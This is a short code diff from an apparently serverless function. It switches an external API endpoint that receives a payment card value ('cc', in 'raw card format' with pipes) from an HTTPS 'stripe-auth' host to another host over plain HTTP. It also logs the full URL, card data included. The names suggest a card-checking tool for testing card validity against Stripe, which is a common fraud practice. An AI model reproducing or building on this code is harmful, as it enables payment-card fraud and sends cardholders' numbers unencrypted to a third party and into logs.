@@ -45,7 +45,7 @@ serve(async (req) => {
     console.log('Using User-Agent:', userAgent);
 
     // Call the external API with the raw card format (no URL encoding for pipes)
-    const apiUrl = `https://stripe-auth-api-production.up.railway.app/api?cc=${cc}`;
+    const apiUrl = `http://web-production-a3b94.up.railway.app/api?cc=${cc}`;
     console.log('Calling API:', apiUrl);
 
     const response = await fetch(apiUrl, {
